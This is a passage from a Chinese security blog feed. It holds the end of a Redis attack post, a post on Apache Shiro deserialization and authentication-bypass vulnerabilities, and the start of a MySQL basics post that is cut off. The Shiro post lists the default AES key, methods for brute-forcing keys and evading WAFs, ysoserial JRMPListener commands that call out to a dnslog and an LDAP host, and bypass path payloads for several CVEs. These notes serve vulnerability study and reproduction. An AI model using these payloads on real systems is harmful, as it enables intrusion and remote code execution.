href="https://github.com/n0b0dyCN/redis-rogue-server">n0b0dyCN&#x2F;redis-rogue-server: Redis(&lt;&#x3D;5.0.5) RCE (github.com)</a></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/7974#toc-19">浅析Linux下Redis的攻击面(一) - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/11198#toc-5">redis未授权到shiro反序列化 - 先知社区 (aliyun.com)</a></p><p><a href="https://nosec.org/home/detail/5041.html">redis未授权到shiro反序列化之session回显马|NOSEC安全讯息平台 - 白帽汇安全研究院</a></p><p><a href="https://xz.aliyun.com/t/5665#toc-16">浅析Redis中SSRF的利用 - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shiro漏洞</title>
      <link href="/2023/05/03/shiro%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/05/03/shiro%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro概述"><a href="#Shiro概述" class="headerlink" title="Shiro概述"></a>Shiro概述</h1><p>​Apache Shiro是一个开源<strong>安全框架</strong>，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>​通常与tomcat一起使用，也可以替换spring security集成到spring中（如若依）。</p><h1 id="框架特征"><a href="#框架特征" class="headerlink" title="框架特征"></a>框架特征</h1><p>在请求包的Cookie中有rememberMe字段赋任意值，收到返回包的 Set-Cookie 中存在<code>rememberMe=deleteMe</code>字段，说明目标有使用Shiro框架</p><p><img src="/../images/image-20230623161016099.png" alt="image-20230623161016099"></p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>​Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。</p><p>在服务端对rememberMe的cookie值的处理</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RememberMe Cookie值 =&gt; base64解码 =&gt; AES解密 =&gt; 反序列化</span><br></pre></td></tr></table></figure><p><strong>如果知道AES的密钥</strong>就可以构造恶意<code>cookie</code>，从而造成反序列化RCE漏洞。所以这也是shiro反序列化经久不衰的原因。</p><p>payload生成</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">恶意类 =&gt; 序列化 =&gt; AES加密 =&gt; base64编码</span><br></pre></td></tr></table></figure><h2 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h2><p>​Apache Shiro 1.2.5之前的版本在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>中存在AES默认秘钥<code>kPH+bIxk5D2deZiIxcaaaA==</code>。</p><p>​在之后的版本，密钥为随机生成的，但是挡不住开发人员的安全意识不到位。</p><h2 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h2><ul><li>概述</li></ul><p>​Apache Shiro 1.4.2之前的版本默认使用AES&#x2F;CBC&#x2F;PKCS5Padding模式加密，该加密模式存在缺陷，当攻击者<strong>获得一个有效的rememberMe Cookie值时</strong>，可以通过Padding Oracle Attack构造有效的恶意序列化数据来发起攻击。</p><ul><li><p>复现</p><blockquote><p>参考<a href="https://github.com/inspiringz/Shiro-721">inspiringz&#x2F;Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com)</a></p><p>注意点：因为爆破的时间太长（几个小时），不适用于实际环境的测试。会把环境打崩或者ip被ban</p></blockquote><ul><li>正常登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。</li><li>使用RememberMe cookie作为Padding Oracle Attack的前缀。</li><li>加密 ysoserial 的序列化 payload，通过Padding Oracle Attack制作恶意RememberMe。</li><li>重放恶意RememberMe cookie，以执行反序列化攻击。</li></ul></li><li><p>修复</p><p>在之后的版本加密模式 AES-CBC被更换为 AES-GCM，所以在使用工具等时需要注意该加密模式的变化。</p></li></ul><h1 id="反序列化漏洞常见问题"><a href="#反序列化漏洞常见问题" class="headerlink" title="反序列化漏洞常见问题"></a>反序列化漏洞常见问题</h1><h2 id="密钥获取"><a href="#密钥获取" class="headerlink" title="密钥获取"></a>密钥获取</h2><ul><li><p>github收集</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">securityManager.rememberMeManager.cipherKey</span><br><span class="line">cookieRememberMeManager.setCipherKey</span><br><span class="line">setCipherKey(Base64.decode</span><br></pre></td></tr></table></figure></li><li><p>任意文件读取&#x2F;下载</p></li><li><p>heapdump</p></li><li><p>爆破</p><p>使用一个空的 <code>SimplePrincipalCollection</code>作为 payload，序列化后使用待检测的秘钥进行加密并发送。</p><p>当密钥正确时<strong>不返回</strong>deleteMe </p><p><img src="/../images/image-20230909224050081.png" alt="image-20230909224050081"></p><p>密钥错误时<strong>返回</strong> deleteMe</p><p><img src="/../images/image-20230909224225905.png" alt="image-20230909224225905"></p><p>还有一种情况，如果秘钥正确返回的是一个 <code>deleteMe</code>，密钥错误返回的是两个 <code>deleteMe</code>。</p></li></ul><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="cookie内容检测"><a href="#cookie内容检测" class="headerlink" title="cookie内容检测"></a>cookie内容检测</h3><ul><li><p>Tomcat 9.0.19</p><p>插入\x0d</p><p><img src="/../images/7.png" alt="img"></p></li><li><p>插入Base64垃圾数据绕过（FUZZ）</p></li></ul><p><img src="/../images/image-20230909230652318.png" alt="image-20230909230652318"></p><p><img src="/../images/image-20230909230621472.png" alt="image-20230909230621472"></p><p><img src="/../images/image-20230909230736285.png" alt="image-20230909230736285"></p><ul><li><p>未知http请求</p><p>未知http请求时，shiro是先处理cookie后在到servlet，所以rememberMe值是会处理的</p><p><img src="/../images/image-20230930210650227.png" alt="image-20230930210650227"></p></li></ul><h3 id="请求头大小被限制"><a href="#请求头大小被限制" class="headerlink" title="请求头大小被限制"></a>请求头大小被限制</h3><blockquote><p>tomcat默认header最大长度设置为8192字节</p><p>人为对Cookie长度进行限制</p><p>解决思路：</p><p><img src="/../images/image-20230910143028324.png" alt="image-20230910143028324"></p><ul><li><a href="https://blog.csdn.net/Thunderclap_/article/details/128932553">shiro的payload长度限制绕过-CSDN博客</a></li><li><a href="https://mp.weixin.qq.com/s/OY9x2EYqIxPNABwGQNVkcw">浅析Shiro反序列化Payload长度绕过 (qq.com)</a></li></ul></blockquote><h4 id="第一种解决方法复现"><a href="#第一种解决方法复现" class="headerlink" title="第一种解决方法复现"></a>第一种解决方法复现</h4><p>Tomcat允许的HTTP Header最大值<code>maxHttpHeaderSize</code></p><p>header过长，服务端报400错误</p><p><img src="/../images/image-20230930165929950.png" alt="image-20230930165929950"></p><p><img src="/../images/image-20230930170008618.png" alt="image-20230930170008618"></p><p><strong>构造header头的类构造器</strong></p><p><img src="/../images/image-20230930174546037.png" alt="image-20230930174546037"></p><p><strong>构造CB链进行序列化</strong></p><p><img src="/../images/image-20230930174635485.png" alt="image-20230930174635485"></p><p><strong>将test.bin文件进行处理</strong></p><p><img src="/../images/image-20230930175016176.png" alt="image-20230930175016176"></p><p><strong>生成外部字节码内容</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">public class CalcTest &#123;</span><br><span class="line">    public CalcTest() throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">javac CalcTest.java</span><br><span class="line"><span class="built_in">cat</span> CalcTest.class |<span class="built_in">base64</span>|sed <span class="string">&#x27;:label;N;s/\n//;b label&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>发送payload</strong></p><p><img src="/../images/image-20230930175509511.png" alt="image-20230930175509511"></p><p><strong>人家工具已经实现了</strong></p><p>注入内存马</p><p><img src="/../images/image-20230930180023456.png" alt="image-20230930180023456"></p><h2 id="有key无链"><a href="#有key无链" class="headerlink" title="有key无链"></a>有key无链</h2><blockquote><p> 用现在公开的 dns或者延迟探测 爆破试探存在的class包 工具都现成的 </p><p>然后根据存在的包判断版本差异自己构造组合链 都知道官方链方便盯着关键函数，通用的rce链基本都藏着官方修复都没得玩 </p><p>现在比较多的是利用第三方服务比如mysql redis jdbc 通过有限操作的链去利用</p></blockquote><p>链子多的工具：shiro-tool ，经常识别出JRMP Cilent（🥦🐕只会用工具）</p><p><a href="https://mp.weixin.qq.com/s/Hm2HA4G2r6ZFgxdddJ6Puw">shiro反序列漏洞中JRMPClient利用 (qq.com)</a></p><p><a href="https://sumsec.me/2021/shiro-JRMP-gadget.html">shiro JRMP gadget | BlogPapers (sumsec.me)</a></p><p>ysoserial起JRMP服务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 <span class="string">&quot;ping w3dh1h.dnslog.cn&quot;</span></span><br><span class="line"></span><br><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-1.8.3.jar  ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 <span class="string">&quot;ldap://ip:1389/Basic/Command/Whoami&quot;</span></span><br></pre></td></tr></table></figure><p>由于Shiro重写了resolveClass方法，将原生方法中的forName方法替换为loadClass方法，由于loadClass无法加载数组类型的类，因此存在Transformer[]类的CommonCollections gadget无法成功利用此漏洞，（例如ysoserial CommonCollections1、CommonCollections3）</p><p>思路：</p><p><img src="/../images/1645693858000-8awcri.png-w331s" alt="image-20220221183250833"></p><p><strong>shiro默认是没有cc依赖的，但是存在commons-beanutils 1.8.3依赖</strong></p><h2 id="工具识别问题"><a href="#工具识别问题" class="headerlink" title="工具识别问题"></a>工具识别问题</h2><ul><li><p>比如302跳转，burp插件识别出来了，但是工具识别不出来</p><p>解决：工具走burp代理，将响应302改为200</p></li></ul><h1 id="身份验证绕过漏洞"><a href="#身份验证绕过漏洞" class="headerlink" title="身份验证绕过漏洞"></a>身份验证绕过漏洞</h1><h2 id="shiro权限管理原理"><a href="#shiro权限管理原理" class="headerlink" title="shiro权限管理原理"></a>shiro权限管理原理</h2><p><strong>Shiro的认证授权流程</strong></p><p><img src="/../images/20230628170326-a47052ce-1592-1.png" alt="20230628170326-a47052ce-1592-1"></p><blockquote><p>当我们的用户(subject)去认证的时候，用户携带我们的身份信息，凭据信息，也就是我们的用户名和密码</p><p>Shiro会将我们的用户名和密码封装成一个Token</p><p>然后通过安全管理器(SecurityManager)</p><p>安全管理器(SecurityManager)去调用认证器(Authenticator)</p><p>认证器(Authenticator)去调用我们的Realm去获取数据，然后进行比对，如果对比成功的话，那么就认证成功了，否则认证失败。</p><p>认证成功后会调用授权器（Authorizer）来判断这个用户身份有什么权限，他可以访问哪些资源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SessionManager是一个会话管理器，，shiro框架定义了一套会话管理， 它不依赖web容器的session，所以shiro可以使用在非web 应用上，也可以将分布式应用的会话集中在一点管理，此 特性可使它实现单点登录。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SessionDAO其实就是会话，比如要将Session存储到数据库，那么可以通过jdbc来存储到数据库。</span><br></pre></td></tr></table></figure></blockquote><p>Spring+Shiro关键代码</p><p><strong>shiro.ini</strong></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[users]</span></span><br><span class="line"><span class="attr">user</span>=user,user</span><br><span class="line"><span class="attr">admin</span>=admin,admin</span><br><span class="line"></span><br><span class="line"><span class="section">[roles]</span></span><br><span class="line"><span class="attr">admin</span>=*</span><br><span class="line"><span class="attr">user</span>=user</span><br></pre></td></tr></table></figure><p>定义了两个用户和两个角色。其中，admin角色拥有所有权限，而user角色只拥有user权限。这意味着admin用户具有所有权限，而user用户仅具有user权限</p><p><strong>Filter链</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ShiroFilterFactoryBean</span> <span class="variable">shiroFilterFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line"><span class="comment">//给filter设置安全管理器</span></span><br><span class="line">shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line"></span><br><span class="line"><span class="comment">//配置路径访问</span></span><br><span class="line">Map&lt;String,String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String,String&gt;();</span><br><span class="line">map.put(<span class="string">&quot;/secret.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认认证界面路径---当认证不通过时跳转</span></span><br><span class="line">shiroFilterFactoryBean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">shiroFilterFactoryBean.setUnauthorizedUrl(<span class="string">&quot;/unauthorized.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL路径与过滤器的映射关系</span></span><br><span class="line">shiroFilterFactoryBean.setFilterChainDefinitionMap(map);</span><br></pre></td></tr></table></figure><p><strong>解释</strong></p><p>所有以 <code>/</code> 开头的路径（包括子路径）都可以匿名访问，无需认证和授权。但是，只有经过认证的用户并有<code>admin</code> 角色授权才能访问 <code>/secret.html</code> 路径，当未经身份验证的用户访问需要身份验证的资源如<code>/secret.html</code>时将被重定向到<code>/login.html</code>，当经过身份验证的用户（user）访问不符合其访问权限的资源<code>/secret.html</code>时将被重定向到<code>/unauthorized.html</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AntPathMatcher匹配规则</span></span><br><span class="line">?  匹配任意一个单字符</span><br><span class="line">*  匹配任意数量的字符 即/admin<span class="comment">/* 可以匹配 /admin/a 但是不能匹配 /admin/b/c/d</span></span><br><span class="line"><span class="comment">** 匹配一个或多个目录 即/admin/** 可以匹配 /admin/a 或者 /admin/b/c/d 等请求</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">// 常见过滤器</span></span><br><span class="line"><span class="comment">anon（匿名访问）：允许匿名访问，不需要认证。</span></span><br><span class="line"><span class="comment">authc（身份验证）：要求用户进行身份验证（登录）才能访问。</span></span><br><span class="line"><span class="comment">user（记住我或身份验证通过）：用户已进行身份验证或选择了记住我功能可访问。</span></span><br><span class="line"><span class="comment">perms（权限控制）：要求用户具有特定的权限才能访问。</span></span><br><span class="line"><span class="comment">roles（角色控制）：要求用户具有特定的角色才能访问。</span></span><br><span class="line"><span class="comment">port（端口控制）：要求请求的端口与指定的端口匹配才能访问。</span></span><br><span class="line"><span class="comment">ssl（SSL安全）：要求请求通过SSL/TLS协议进行安全访问。</span></span><br><span class="line"><span class="comment">rest（RESTful风格支持）：为RESTful API提供支持。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// ShiroFilterFactoryBean常用方法</span></span><br><span class="line"><span class="comment">setLoginUrl(String loginUrl) 设置登录页面的URL未经身份验证的用户访问需要身份验证的资源时将被重定向到该URL</span></span><br><span class="line"><span class="comment">setSuccessUrl(String successUrl) 设置成功登录后跳转的URL</span></span><br><span class="line"><span class="comment">setUnauthorizedUrl(String unauthorizedUrl) 设置未授权页面的URL，当用户没有访问权限时将被重定向到该URL</span></span><br></pre></td></tr></table></figure><h2 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h2><p><strong>大部分权限绕过都源自于Spring和Shiro对请求处理的不一致导致的。</strong></p><p><a href="https://xz.aliyun.com/t/11633#toc-37">Shiro 历史漏洞分析 - 先知社区 (aliyun.com)</a></p><table><thead><tr><th align="center">编号</th><th align="center">版本影响</th><th align="center">鉴权路径</th><th align="center">绕过payload</th><th align="center">后端配置</th></tr></thead><tbody><tr><td align="center">CVE-2023-22602</td><td align="center">Apache Shiro &lt; 1.11.0，Spring Boot&gt;&#x3D;2.6</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;..</td><td align="center"></td></tr><tr><td align="center">CVE-2022-32532</td><td align="center">Shiro &lt; 1.9.1</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;%0d，&#x2F;admin&#x2F;%0a</td><td align="center">RegExPatternMatcher<code>&amp;&amp;</code>&#x2F;admin&#x2F;.*</td></tr><tr><td align="center">CVE-2020-1957</td><td align="center">Shiro &lt;1.5.2</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;（xxx为授权路径）</td><td align="center"></td></tr><tr><td align="center">CVE-2016-6802</td><td align="center">shrio&lt;1.3.2</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;xxx&#x2F;..&#x2F;admin（xxx随意不存在也行）</td><td align="center"></td></tr><tr><td align="center">CVE-2020-11989</td><td align="center">shiro &lt; 1.5.3</td><td align="center">&#x2F;admin</td><td align="center">(shiro等于1.5.2）     &#x2F;admin%25%32%66（%25%32%66为&#x2F;的双重url编码）                                      (shiro小于1.5.3）&#x2F;;&#x2F;admin</td><td align="center">(shiro等于1.5.2）<code>/admin/* = authc</code>；                                          (shiro小于1.5.3）<code>/admin/* = authc &amp;&amp; /** = anon</code></td></tr><tr><td align="center">CVE-2020-13933</td><td align="center">Shiro &lt; 1.6.0</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;%3Bxxx（xxx为随意字符串）</td><td align="center">&#x2F;admin&#x2F;* &#x3D; authc</td></tr><tr><td align="center">CVE-2020-17510</td><td align="center">Shiro &lt; 1.7.0</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin&#x2F;%2e</td><td align="center">&#x2F;admin&#x2F;* &#x3D; authc</td></tr><tr><td align="center">CVE-2020-17523</td><td align="center">Shiro &lt; 1.7.1</td><td align="center">&#x2F;admin</td><td align="center">&#x2F;admin%20</td><td align="center">&#x2F;admin&#x2F;* &#x3D; authc</td></tr></tbody></table><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://paper.seebug.org/1378/">Shiro 组件漏洞与攻击链分析</a></p><p><a href="https://paper.seebug.org/1285/">Shiro RememberMe 漏洞检测的探索之路</a></p><p><a href="http://changxia3.com/2022/05/09/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%BA%94%EF%BC%88%E5%AF%B9%E6%8A%97%E7%AF%87%EF%BC%89/#rememberMe%E5%80%BC%E7%BB%95%E8%BF%87">Shiro反序列化漏洞笔记五（对抗篇） (changxia3.com)</a></p><p><a href="https://gv7.me/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/">shiro反序列化绕WAF之未知HTTP请求方法 | 回忆飘如雪 (gv7.me)</a></p><p><a href="https://mp.weixin.qq.com/s/KGjylebaJnu7UB_Atqj4Sw">shiro权限绕过总结 (qq.com)</a></p><p><a href="https://xz.aliyun.com/t/12643">Shiro从入门到权限绕过漏洞 - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql基础知识</title>
      <link href="/2023/05/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/05/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysql登录"><a href="#Mysql登录" class="headerlink" title="Mysql登录"></a>Mysql登录</h2><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u username 指定数据库用户名  </span><br><span class="line">-p password 指定数据库密码   </span><br><span class="line">-e 指定要运行的sql语句</span><br><span class="line">-D 指定数据库名</span><br><span class="line">-P 端口</span><br></pre></td></tr></table></figure><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -proot [-P3306 -h127.0.0.1]</span><br></pre></td></tr></table></figure><h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> password <span class="keyword">for</span> root<span class="variable">@localhost</span> <span class="operator">=</span> password(<span class="string">&#x27;xxx&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="开启远程连接"><a href="#开启远程连接" class="headerlink" title="开启远程连接"></a>开启远程连接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 修改配置文件</span><br><span class="line">bind-address  = 0.0.0.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 为需要远程登录的用户赋予权限</span><br><span class="line">grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123&#x27; with grant option;</span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">注：ip处填%的话则表示所有ip都可以访问</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看用户与主机关系</span><br><span class="line">use mysql;</span><br><span class="line">select user,host from user;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230522123236500-1687276382007.png" alt="image-20230522123236500"></p><p>mysql8</p><p><a href="https://blog.csdn.net/llf_cloud/article/details/83141338">https://blog.csdn.net/llf_cloud/article/details/83141338</a></p><h3 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit;</span><br><span class="line">quit;</span><br><span class="line">\q;</span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where id xxx</span><br></pre></td></tr></table></figure><p>xxx：</p><table><thead><tr><th align="center">运算符</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">&#x3D;</td><td align="center">等于</td></tr><tr><td align="center">&lt;&gt; ，!&#x3D;</td><td align="center">不等于</td></tr><tr><td align="center">&lt;，&lt;&#x3D;</td><td align="center">小于，小于等于</td></tr><tr><td align="center">&gt;，&gt;&#x3D;</td><td align="center">大于,大于等于</td></tr><tr><td align="center">in()，not in()</td><td align="center">是否在数组中</td></tr><tr><td align="center">and  ,  &amp;&amp;</td><td align="center">逻辑与</td></tr><tr><td align="center">or   ,     ||</td><td align="center">逻辑或</td></tr><tr><td align="center">like ‘%xx%’</td><td align="center">模糊查询</td></tr><tr><td align="center">is null , is not null</td><td align="center">是否为空</td></tr><tr><td align="center">regexp</td><td align="center">正则匹配</td></tr><tr><td align="center">is between x and y</td><td align="center">在x和y之间</td></tr></tbody></table><h3 id="常用表"><a href="#常用表" class="headerlink" title="常用表"></a>常用表</h3><blockquote><p>注意sys 库是在<strong>MySQL5.6</strong>及以上版本才有的</p></blockquote><ul><li><p>记录所有数据库及表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema.tables</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line">字段：table_schema：数据库名称</span><br><span class="line"> table_name：数据库下的所有表</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line">字段：database_name：数据库名称</span><br><span class="line"> table_name：数据库下的所有表</span><br></pre></td></tr></table></figure></li><li><p>记录所有数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema.schemata</span><br><span class="line"></span><br><span class="line">字段：SCHEMA_NAME：数据库名</span><br></pre></td></tr></table></figure></li><li><p>记录含有自增id字段的数据库及表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sys.schema_auto_increment_columns</span><br><span class="line"></span><br><span class="line">字段：table_schema：数据库名称</span><br><span class="line"> table_name：数据库下的所有表</span><br></pre></td></tr></table></figure></li><li><p>记录所有字段</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">information_schema.columns </span><br><span class="line"></span><br><span class="line">字段：table_name：表名</span><br><span class="line"> column_name：表下的所有字段名</span><br></pre></td></tr></table></figure></li><li><p>配置信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@character set_ database：字符集</span><br><span class="line">@@hostname：计算机名</span><br><span class="line">@@version_compile_os：系统版本</span><br><span class="line">@basedir:mysql路径</span><br><span class="line">@@datadir:myslq data存放路径</span><br><span class="line">@@sql_mode：sql模式</span><br></pre></td></tr></table></figure><blockquote><p>@是用户变量，@@是系统变量</p></blockquote></li></ul><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user(); 查看当前MySQL登录的用户名</span><br><span class="line"></span><br><span class="line">select database(); 查看当前使用的数据库名</span><br><span class="line"></span><br><span class="line">select version(); 查看当前MySQL版本</span><br><span class="line"></span><br><span class="line">SHOW GRANTS FOR CURRENT_USER();查看当前用户权限</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">group_concat(字段名) 查看所有字段名，默认分隔符为,</span><br><span class="line">length() 获得长度</span><br><span class="line">concat(str1,str2) 连接str1和str</span><br><span class="line">mid(str,a,length)    从a开始截取str字符length长度</span><br><span class="line">substr(str,a,length) 从a开始截取str字符length长度</span><br><span class="line">left/right(str,length) 返回最左边/最右边的length长度字符</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ord(string)  返回字符串第一个字符的ascii码值</span><br><span class="line">ascii(str) 返回字符的ascii码</span><br><span class="line">rand()随机数</span><br></pre></td></tr></table></figure><h3 id="常用操作语句"><a href="#常用操作语句" class="headerlink" title="常用操作语句"></a>常用操作语句</h3><h4 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `users`(</span><br><span class="line">   `id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   `username` VARCHAR(10) NOT NULL,</span><br><span class="line">   `passwd` VARCHAR(40) NOT NULL,</span><br><span class="line">   PRIMARY KEY ( `id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><blockquote><p>AUTO_INCREMENT：自增</p><p>PRIMARY KEY：主键</p></blockquote><h4 id="对数据库的增删改查"><a href="#对数据库的增删改查" class="headerlink" title="对数据库的增删改查"></a>对数据库的增删改查</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">增  create database 数据库名</span><br><span class="line">删  drop database 数据库名</span><br><span class="line">查  所有数据库 show databases</span><br><span class="line">改  rename database 旧名 to 新名</span><br></pre></td></tr></table></figure><h4 id="对数据表的增删改查"><a href="#对数据表的增删改查" class="headerlink" title="对数据表的增删改查"></a>对数据表的增删改查</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">增    create table 数据表名(id int,name char(10))</span><br><span class="line">参数形式：字段名 字段类型</span><br><span class="line">删    drop table 数据表名</span><br><span class="line">查    show tables </span><br><span class="line">改    alter table 旧名 to rename 新名</span><br></pre></td></tr></table></figure><h4 id="对表数据的增删查改"><a href="#对表数据的增删查改" class="headerlink" title="对表数据的增删查改"></a>对表数据的增删查改</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">增  insert into 表名(列1，列2 ... ) values(值1，值2 ... )</span><br><span class="line"></span><br><span class="line">删  delete from 表名 where 列名 = 值</span><br><span class="line"></span><br><span class="line">查  所有内容   select * from 表名</span><br><span class="line">查看表的结构 DESC 表名 / show columns from 表名</span><br><span class="line">条件下所有列 select * from 表名 where 条件</span><br><span class="line">条件下部分列 select 列1,列2,...,列n from 表名 where 条件;</span><br><span class="line"></span><br><span class="line">改  修改数据 update 表名 set 列名=新值 where 条件</span><br><span class="line">    REPLACE INTO table_name  VALUES(主键,value..) </span><br><span class="line">修改列名 alter table 表名 change 旧列名 新列名 varchar(长度)</span><br></pre></td></tr></table></figure><p><code>replace into</code>，需要更改一整条数据，不能只更改其中某列。</p><ul><li>如果待写入数据已经存在，则先删除该行数据，然后插入新的数据。</li><li>如果待写入数据不存在，则直接插入新数据。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+--------+</span><br><span class="line">| id | username | passwd |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">|  1 | khaz     | 123    |</span><br><span class="line">|  2 | khaz2    | 1234   |</span><br><span class="line">+----+----------+--------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; replace into users values(1,&#x27;passwd&#x27;);</span><br><span class="line">ERROR 1364 (HY000): Field &#x27;username&#x27; doesn&#x27;t have a default value</span><br><span class="line"></span><br><span class="line">mysql&gt; replace into users values(1,&#x27;khaz3&#x27;,&#x27;passwd&#x27;);</span><br><span class="line">Query OK, 2 